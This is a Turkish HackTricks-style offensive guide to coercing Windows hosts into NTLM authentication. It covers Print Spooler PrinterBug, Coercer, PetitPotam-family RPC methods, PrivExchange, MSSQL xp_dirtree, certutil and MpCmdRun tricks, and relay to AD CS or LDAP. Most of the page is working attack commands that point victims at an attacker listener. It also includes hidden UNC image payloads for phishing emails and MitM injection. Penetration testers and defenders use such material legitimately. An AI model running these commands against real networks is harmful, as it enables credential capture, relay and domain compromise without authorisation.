# NTLM Ayrıcalıklı Kimlik Doğrulamayı Zorlama

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) , 3. taraf bağımlılıklardan kaçınmak için MIDL compiler kullanarak C# ile kodlanmış **uzak kimlik doğrulama tetikleyicileri**nden oluşan bir **koleksiyon**dur.

## Spooler Service Abuse

_**Print Spooler**_ servisi **etkinse,** zaten bilinen bazı AD credentials kullanarak Domain Controller’ın print server’ından yeni print jobs için bir **güncelleme** isteyebilir ve yalnızca bildirimi bazı sisteme **göndermesini** söyleyebilirsiniz.\
Printer bildirimi rastgele bir sisteme gönderdiğinde, o **sisteme karşı kimlik doğrulaması** yapması gerekir. Bu nedenle, bir attacker _**Print Spooler**_ servisinin rastgele bir sisteme karşı kimlik doğrulaması yapmasını sağlayabilir ve servis bu kimlik doğrulamada **computer account** kullanır.

Perde arkasında, klasik **PrinterBug** primitive, **`\\PIPE\\spoolss`** üzerinden **`RpcRemoteFindFirstPrinterChangeNotificationEx`** istismar eder. Attacker önce bir printer/server handle açar ve ardından `pszLocalMachine` içinde sahte bir client name sağlar; böylece target spooler, attacker-controlled host’a **geri** bir notification channel oluşturur. Bu yüzden etki, doğrudan code execution değil **outbound authentication coercion**’dır.\
Spooler’ın kendisinde **RCE/LPE** arıyorsanız, [PrintNightmare](printnightmare.md) bölümüne bakın. Bu sayfa **coercion ve relay** üzerine odaklanır.

### Domain üzerindeki Windows Server’ları bulma

PowerShell kullanarak Windows box listesini alın. Server’lar genellikle önceliklidir, bu yüzden onlara odaklanalım:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Dinleyen Spooler servislerini bulma

Biraz değiştirilmiş @mysmartlogin'in (Vincent Le Toux'nun) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracını kullanarak, Spooler Service'in dinleyip dinlemediğini kontrol edin:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux üzerinde `rpcdump.py` de kullanabilir ve **MS-RPRN** protocolünü arayabilirsiniz:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Linux'tan **NetExec/CrackMapExec** ile host'ları hızlıca test edin:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Eğer sadece spooler endpoint’inin var olup olmadığını kontrol etmek yerine **coercion surfaces**’i enumerate etmek istiyorsanız, **Coercer scan mode** kullanın:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Bu yararlıdır çünkü EPM içinde endpoint’i görmek size yalnızca print RPC interface’in kaydedildiğini söyler. Bu, her coercion method’unun mevcut yetkilerinizle erişilebilir olduğunu veya host’un kullanılabilir bir authentication flow üreteceğini **garanti etmez**.

### Servisten keyfi bir host’a authenticate olmasını isteyin

[SpoolSample’i buradan](https://github.com/NotMedic/NetNTLMtoSilverTicket) derleyebilirsiniz.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ve Linux'taysanız [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
**Coercer** ile spooler arayüzlerini doğrudan hedefleyebilir ve hangi RPC methodunun exposed olduğunu tahmin etmekten kaçınabilirsiniz:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### WebClient ile SMB yerine HTTP zorlamak

Klasik PrinterBug genellikle `\\attacker\share` adresine **SMB** kimlik doğrulaması üretir; bu hâlâ **capture**, **HTTP targets**'a **relay** veya **SMB signing** olmayan yerlere **relay** için faydalıdır.\
Ancak modern ortamlarda, **SMB to SMB** relay çoğu zaman **SMB signing** tarafından engellenir, bu yüzden operatörler sıklıkla bunun yerine **HTTP/WebDAV** kimlik doğrulamasını zorlamayı tercih eder.

Hedefte **WebClient** servisi çalışıyorsa, listener Windows’un **HTTP üzerinden WebDAV** kullanmasını sağlayacak bir biçimde belirtilebilir:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Bu özellikle **`ntlmrelayx --adcs`** veya diğer HTTP relay hedefleriyle zincirleme yaparken faydalıdır, çünkü zorlanmış bağlantıda SMB relayability’ye güvenmeyi ortadan kaldırır. Önemli not: HTTP/WebDAV varyantının çalışması için kurban üzerinde **WebClient çalışıyor olmalıdır**.

### Unconstrained Delegation ile birleştirme

Bir saldırgan zaten [Unconstrained Delegation](unconstrained-delegation.md) olan bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayar üzerinde kimlik doğrulaması yapmasını sağlayabilir**. Unconstrained Delegation nedeniyle, yazıcının **bilgisayar hesabına ait TGT** bu Unconstrained Delegation olan bilgisayarın **memory**’sinde **saklanır**. Saldırgan bu host’u zaten ele geçirdiği için, bu **ticket**’i **geri alabilir** ve suistimal edebilir ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: aynı spooler pipe üzerinde asenkron print interface; belirli bir host üzerinde erişilebilir methodları enumerate etmek için Coercer kullanın
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Not: Bu methodlar, UNC path taşıyabilen parametreleri kabul eder (ör. `\\attacker\share`). İşlendiğinde, Windows bu UNC’ye karşı kimlik doğrular (machine/user context), böylece NetNTLM capture veya relay mümkün olur.\
Spooler abuse için, **MS-RPRN opnum 65** hâlâ en yaygın ve en iyi belgelenmiş primitive’dir; çünkü protocol specification, server’ın `pszLocalMachine` ile belirtilen client’a geri bir notification channel oluşturduğunu açıkça söyler.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: target, verilen backup log path’ini açmaya çalışır ve attacker-controlled UNC’ye kimlik doğrular.
- Practical use: Tier 0 asset’leri (DC/RODC/Citrix/etc.) NetNTLM üretmeye zorla, ardından AD CS endpoint’lerine (ESC8/ESC11 scenarios) veya diğer privileged service’lere relay et.

## PrivExchange

`PrivExchange` attack, **Exchange Server `PushSubscription` feature** içinde bulunan bir flaw sonucudur. Bu feature, mailbox sahibi herhangi bir domain user tarafından Exchange server’ın HTTP üzerinden client tarafından sağlanan herhangi bir host’a authenticate olmaya zorlanmasına izin verir.

Varsayılan olarak, **Exchange service SYSTEM olarak çalışır** ve aşırı privilege’lar verilir (özellikle, **pre-2019 Cumulative Update domain üzerinde WriteDacl privileges**’a sahiptir). Bu flaw, **LDAP’e information relaying** yapılmasını ve ardından domain NTDS database’inin çıkarılmasını sağlamak için exploit edilebilir. LDAP’e relaying mümkün olmadığında bile, bu flaw domain içindeki diğer host’lara relay ve authenticate etmek için kullanılabilir. Bu attack’in başarılı exploitation’ı, herhangi bir authenticated domain user account ile anında Domain Admin access sağlar.

## Inside Windows

Zaten Windows machine’in içindeyseniz, Windows’u privileged accounts kullanarak bir server’a bağlanmaya zorlayabilirsiniz:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ya da şu diğer tekniği kullanın: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

NTLM kimlik doğrulamasını zorlamak için certutil.exe lolbin (Microsoft tarafından imzalanmış binary) kullanmak mümkündür:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Bir makineye giriş yapan kullanıcının **email address**’ini biliyorsanız, ona sadece örneğin şöyle bir **1x1 image** içeren bir **email** gönderebilirsiniz:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
ve açtığında, kimlik doğrulaması yapmaya çalışacak.

### MitM

Bir bilgisayara MitM saldırısı gerçekleştirebilir ve onun görüntüleyeceği bir sayfaya HTML enjekte edebilirseniz, sayfaya aşağıdakine benzer bir görüntü enjekte etmeyi deneyebilirsiniz:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM authentication'ı zorlamak ve phishing yapmak için diğer yollar


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 cracking

Eğer [NTLMv1 challenges'ları capture edebilirseniz, bunları nasıl crack edeceğinizi burada okuyun](../ntlm/index.html#ntlmv1-attack).\
_Unutmayın ki NTLMv1'i crack etmek için Responder challenge değerini "1122334455667788" olarak ayarlamanız gerekir_

## Referanslar
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
